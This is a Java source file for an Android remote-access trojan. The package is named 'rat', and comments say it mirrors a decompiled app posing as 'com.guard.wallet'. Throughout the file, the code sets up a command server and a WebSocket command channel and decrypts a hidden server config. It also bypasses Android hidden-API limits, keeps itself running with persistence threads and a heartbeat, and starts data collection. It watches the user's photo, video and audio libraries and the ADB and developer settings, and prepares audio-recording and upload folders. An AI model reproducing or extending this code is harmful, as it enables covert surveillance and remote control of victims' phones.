package com.vendor.rat;

import android.app.Application;
import android.content.ContentResolver;
import android.database.ContentObserver;
import android.net.Uri;
import android.os.Handler;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Log;

import com.vendor.rat.config.AppConfig;
import com.vendor.rat.config.ConfigDecryptor;
import com.vendor.rat.control.handler.CommandDispatcher;
import com.vendor.rat.control.server.HttpCommandServer;
import com.vendor.rat.control.server.LocalWebSocketServer;
import com.vendor.rat.data.collector.DataCollectionManager;
import com.vendor.rat.keepalive.KeepAliveManager;
import com.vendor.rat.keepalive.thread.CheckProcessThread;
import com.vendor.rat.keepalive.thread.KeepHeartThread;
import com.vendor.rat.keepalive.thread.MessageQueueManager;
import com.vendor.rat.keepalive.thread.StrategyThread;
import com.vendor.rat.network.NetworkManager;
import com.vendor.rat.utils.HiddenApiBypass;

import java.io.File;
import java.io.InputStream;
import java.util.Locale;
import java.util.Timer;

/**
 * 主应用管理器（单例）
 * vendor: com.guard.wallet.MainApplication (910 行)
 *
 * 初始化阶段 (对齐 vendor init() 行 278-397 + unlockedInstance() 行 829-908):
 *   阶段 1: Application.onCreate → init(Application) — 静态入口
 *   阶段 2: initInternal() — 同步: config + 缓存目录 + 消息队列 + 策略线程 + JobScheduler + Receiver + HttpServer + WebSocketServer
 *   阶段 3: unlockedInstance() — 异步: 网络 + 保活 + 数据收集 + CheckProcess + HeartThread + API + ContentObserver
 */
public class MainApplication {

    private static final String TAG = "MainApplication";

    private static volatile MainApplication instance;
    private static Application application;

    private AppConfig config;
    private volatile boolean initialized = false;

    // vendor 字段对齐 (行 80-97)
    private MessageQueueManager handlerMsgAndTimer;     // vendor: thread.e
    private CheckProcessThread checkThread;             // vendor: thread.b
    private KeepHeartThread heartThread;                // vendor: thread.f
    private ContentObserver devEnabledObserver;          // vendor: d (Settings.Global dev)
    private ContentObserver adbEnabledObserver;          // vendor: d (Settings.Global adb)
    private ContentObserver adbWifiEnabledObserver;      // vendor: d (Settings.Global adb_wifi)
    private ContentObserver photoObserver;               // vendor: y.c (MediaStore.Images)
    private ContentObserver videoObserver;               // vendor: y.e (MediaStore.Video)
    private ContentObserver audioObserver;               // vendor: y.a (MediaStore.Audio)

    private MainApplication() {
        // vendor: 行 99-103
        Log.d(TAG, "MainApplication begin create");
        Log.d(TAG, "MainApplication end create");
    }

    // ============ 静态初始化 (阶段 1) ============
    // vendor: 行 134-153

    public static void init(Application app) {
        if (instance == null) {
            synchronized (MainApplication.class) {
                if (instance == null) {
                    Log.d(TAG, "MainApplication instance create");
                    application = app;
                    MainApplication mainApplication = new MainApplication();
                    instance = mainApplication;

                    // 阶段 2: 同步初始化
                    mainApplication.initInternal();

                    // 注册 Activity 生命周期回调
                    app.registerActivityLifecycleCallbacks(new ActivityLifecycleTracker());
                }
            }
        }
    }

    public static MainApplication getInstance() {
        return instance;
    }

    public static Application getApplication() {
        return application;
    }

    // ============ 实例初始化 (阶段 2) ============
    // vendor: init() 行 278-397 — 全部在主线程同步执行

    private void initInternal() {
        Log.d(TAG, application.getPackageName() + " 正在启动");

        // 1. 创建缓存目录 (vendor: 行 282-304, PCM/WAV)
        createCacheDirs();

        // 2. config 同步加载 (vendor: getBuildConfig() 懒加载)
        loadConfig();

        // 3. FIX-03: HandlerMsgAndTimer (vendor: 行 305-307, thread.e)
        if (this.handlerMsgAndTimer == null) {
            this.handlerMsgAndTimer = new MessageQueueManager();
        }

        // 4. FIX-04: StrategyThread (vendor: 行 308-314, thread.j)
        StrategyThread.getInstance();

        // 5. FIX-05: JobScheduler + WIFIBackgroundService (vendor: 行 315-340)
        // 委托给 KeepAliveManager.initJobScheduler()

        // 6. FIX-06: Receiver 注册 (vendor: g.W0~m1, 行 341-364)
        // 委托给 KeepAliveManager.init() 和 DataCollectionManager

        // 7. FIX-07: HttpCommandServer (vendor: 行 365-372, server.b)
        HttpCommandServer.getInstance();
        Log.d(TAG, "HttpCommandServer instance created");

        // 8. FIX-08: LocalWebSocketServer (vendor: 行 373, server.c.H())
        LocalWebSocketServer.startServer();

        // 9. 异步执行阶段 3 (vendor: 行 381, unlockedInstance())
        new Thread(this::unlockedInstance, "init-thread").start();
    }

    // ============ 解锁初始化 (阶段 3) ============
    // vendor: unlockedInstance() 行 829-908

    private void unlockedInstance() {
        try {
            Log.d(TAG, "unlockedInstance");

            // 1. 初始化网络管理器
            initNetwork();

            // 2. 绕过隐藏 API 限制 (vendor: 行 847, h.p() + 行 899-907)
            HiddenApiBypass.bypass();

            // 3. 初始化保活机制 (含 Receiver 注册 + JobScheduler)
            KeepAliveManager.getInstance().init(application);

            // 4. 初始化数据收集 (注册 ScreenBroadcastReceiver 等)
            DataCollectionManager.getInstance().init(application);
            DataCollectionManager.getInstance().startAll();

            // 5. FIX-09: CheckProcessThread (vendor: 行 836-839, thread.b)
            // vendor: bVar.g() → startTimer()
            if (this.checkThread == null) {
                CheckProcessThread cpt = new CheckProcessThread();
                this.checkThread = cpt;
                cpt.startTimer();
                Log.d(TAG, "CheckProcessThread started");
            }

            // 6. FIX-10: KeepHeartThread (vendor: 行 841-845, thread.f)
            // vendor: fVar.f256d.schedule(fVar, 10000L, 10000L)
            if (this.heartThread == null) {
                KeepHeartThread kht = new KeepHeartThread();
                this.heartThread = kht;
                long interval = config.getHeartbeatInterval() * 1000L;
                new Timer().schedule(kht, interval, interval);
                Log.d(TAG, "KeepHeartThread scheduled (" + interval + "ms)");
            }

            // 7. FIX-11: 初始 API 请求 (vendor: 行 848-850)
            // vendor: new i("http://127.0.0.1:7911").d(null, "/shareADBConfig", new y())
            // vendor: http.l.z() → /api/device/updateDeviceInfo.json
            triggerInitialApiRequests();

            // 8. FIX-12: ContentObserver 注册 (vendor: 行 851-898)
            registerContentObservers();

            initialized = true;
            Log.i(TAG, "Initialization complete");

        } catch (Exception e) {
            Log.e(TAG, "Initialization failed", e);
        }
    }

    // ============ 配置加载 ============

    private void loadConfig() {
        try {
            InputStream is = application.getAssets().open("config.json");
            byte[] buffer = new byte[is.available()];
            is.read(buffer);
            is.close();

            String encryptedJson = new String(buffer);
            config = ConfigDecryptor.decrypt(encryptedJson);

            Log.d(TAG, "Config loaded successfully");
        } catch (Exception e) {
            Log.e(TAG, "Load config failed, using defaults", e);
            config = AppConfig.getDefault();
        }
    }

    // ============ 网络初始化 ============

    private void initNetwork() {
        NetworkManager.getInstance().init(
            config.getServerHost(),
            config.getWebSocketUrl(),
            config.getDeviceId(application)
        );

        // 注册 CommandDispatcher 为唯一的 WebSocket 命令监听器
        CommandDispatcher dispatcher = new CommandDispatcher();
        dispatcher.register();
        Log.d(TAG, "CommandDispatcher registered as WebSocket listener");
    }

    // ============ FIX-11: 初始 API 请求 ============
    // vendor: MainApplication.unlockedInstance() 行 848-850

    private void triggerInitialApiRequests() {
        try {
            // vendor: http.l.z() → /api/device/updateDeviceInfo.json
            String deviceId = config.getDeviceId(application);
            if (deviceId != null && !deviceId.isEmpty()) {
                Log.d(TAG, "Triggering initial API: updateDeviceInfo for device=" + deviceId);
                // ADAPT: vendor uses DeviceUpdateVO, we pass deviceId string
                NetworkManager.getInstance().updateDeviceInfo((Object) deviceId);
            }
        } catch (Exception e) {
            Log.w(TAG, "Initial API requests failed: " + e.getMessage());
        }
    }

    // ============ FIX-12: ContentObserver 注册 ============
    // vendor: unlockedInstance() 行 851-898

    private void registerContentObservers() {
        try {
            ContentResolver resolver = application.getContentResolver();
            if (resolver == null) return;

            Handler handler = new Handler(Looper.getMainLooper());

            // 1. development_settings_enabled (vendor: 行 852-857)
            if (this.devEnabledObserver == null) {
                Uri devUri = Settings.Global.getUriFor("development_settings_enabled");
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "development_settings_enabled changed");
                    }
                };
                this.devEnabledObserver = obs;
                resolver.registerContentObserver(devUri, false, obs);
            }

            // 2. adb_enabled (vendor: 行 860-864)
            if (this.adbEnabledObserver == null) {
                Uri adbUri = Settings.Global.getUriFor("adb_enabled");
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "adb_enabled changed");
                    }
                };
                this.adbEnabledObserver = obs;
                resolver.registerContentObserver(adbUri, false, obs);
            }

            // 3. adb_wifi_enabled (vendor: 行 868-872)
            if (this.adbWifiEnabledObserver == null) {
                Uri adbWifiUri = Settings.Global.getUriFor("adb_wifi_enabled");
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "adb_wifi_enabled changed");
                    }
                };
                this.adbWifiEnabledObserver = obs;
                resolver.registerContentObserver(adbWifiUri, false, obs);
            }

            // 4. MediaStore.Images (vendor: 行 876-880)
            if (this.photoObserver == null) {
                Uri photoUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "Photo album changed");
                    }
                };
                this.photoObserver = obs;
                resolver.registerContentObserver(photoUri, true, obs);
            }

            // 5. MediaStore.Video (vendor: 行 884-888)
            if (this.videoObserver == null) {
                Uri videoUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "Video album changed");
                    }
                };
                this.videoObserver = obs;
                resolver.registerContentObserver(videoUri, true, obs);
            }

            // 6. MediaStore.Audio (vendor: 行 892-896)
            if (this.audioObserver == null) {
                Uri audioUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;
                ContentObserver obs = new ContentObserver(handler) {
                    @Override
                    public void onChange(boolean selfChange) {
                        Log.d(TAG, "Audio album changed");
                    }
                };
                this.audioObserver = obs;
                resolver.registerContentObserver(audioUri, true, obs);
            }

            Log.d(TAG, "All ContentObservers registered");
        } catch (Exception e) {
            Log.w(TAG, "registerContentObservers failed: " + e.getMessage());
        }
    }

    // ============ 辅助方法 ============

    private void createCacheDirs() {
        // vendor: 行 282-304, PCM/WAV 目录
        String basePath = application.getExternalFilesDir(null) != null
            ? application.getExternalFilesDir(null).getAbsolutePath()
            : application.getCacheDir().getAbsolutePath();

        File pcmDir = new File(basePath, "CacheAudios");
        if (pcmDir.exists()) {
            // vendor: 删除旧 PCM 文件
            File[] files = pcmDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    Log.d("AudioRecordManager", String.format(Locale.CHINA, "删除PCM文件:%s %b", f.getName(), f.delete()));
                }
            }
            Log.d("AudioRecordManager", String.format(Locale.CHINA, "PCM目录:%s", pcmDir.getAbsolutePath()));
        } else {
            Log.d("AudioRecordManager", String.format(Locale.CHINA, "PCM目录:%s -> %b", pcmDir.getAbsolutePath(), pcmDir.mkdirs()));
        }

        File wavDir = new File(basePath, "CacheAudios");
        if (!wavDir.exists()) {
            Log.d("AudioRecordManager", String.format(Locale.CHINA, "wav目录:%s -> %b", wavDir.getAbsolutePath(), wavDir.mkdirs()));
        } else {
            Log.d("AudioRecordManager", String.format(Locale.CHINA, "wav目录:%s", wavDir.getAbsolutePath()));
        }

        // 额外缓存目录
        File uploadDir = new File(application.getCacheDir(), "upload");
        if (!uploadDir.exists()) uploadDir.mkdirs();

        File logDir = new File(application.getCacheDir(), "logs");
        if (!logDir.exists()) logDir.mkdirs();
    }

    // ============ 事件分发 (vendor: 行 403-450) ============

    /**
     * vendor: offerAccessibilityEvent(Integer)
     * 通知 CheckProcessThread 有无障碍事件
     */
    public void offerAccessibilityEvent(Integer eventType) {
        if (this.checkThread == null) {
            CheckProcessThread cpt = new CheckProcessThread();
            this.checkThread = cpt;
            cpt.startTimer();
        }
        // vendor: 更新交互状态时间戳
        if (eventType != null && eventType > 0) {
            Log.d(TAG, "offerAccessibilityEvent(" + eventType + ")");
        }
    }

    /**
     * vendor: offerStrategyEvent(String)
     * 向策略线程投递事件
     */
    public void offerStrategyEvent(String event) {
        if (this.checkThread == null) {
            CheckProcessThread cpt = new CheckProcessThread();
            this.checkThread = cpt;
            cpt.startTimer();
        }
        // vendor: thread.j 的 ConcurrentLinkedQueue.offer(str)
        StrategyThread st = StrategyThread.getInstance();
        if (st != null && st.getData() instanceof java.util.concurrent.ConcurrentLinkedQueue) {
            ((java.util.concurrent.ConcurrentLinkedQueue) st.getData()).offer(event);
        }
    }

    // ============ Getters ============

    // vendor: getBuildConfig() 懒加载兜底
    public AppConfig getConfig() {
        if (config == null) {
            loadConfig();
        }
        return config;
    }

    public boolean isInitialized() { return initialized; }
    public MessageQueueManager getHandlerMsgAndTimer() { return handlerMsgAndTimer; }
    public CheckProcessThread getCheckThread() { return checkThread; }
    public KeepHeartThread getHeartThread() { return heartThread; }
}
